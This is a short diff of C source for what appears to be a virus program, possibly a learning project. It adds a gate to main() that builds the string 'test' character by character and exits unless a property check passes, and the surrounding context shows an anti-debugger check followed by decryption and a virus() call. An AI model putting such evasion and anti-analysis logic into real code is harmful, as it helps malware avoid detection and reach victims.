@@ -98,6 +98,14 @@ int virus(int ac, char **av){
 }
 
 int main(int ac, char **av){
+	char cmp[5];
+	cmp[0] = 't';
+	cmp[1] = 'e';
+	cmp[2] = 's';
+	cmp[3] = 't';
+	cmp[4] = '\0';
+	if (check_prop(cmp) == FALSE)
+		return TRUE;
 	if (checkdebug() == 0)
 	{
 		return decrypt() && virus(ac, av);
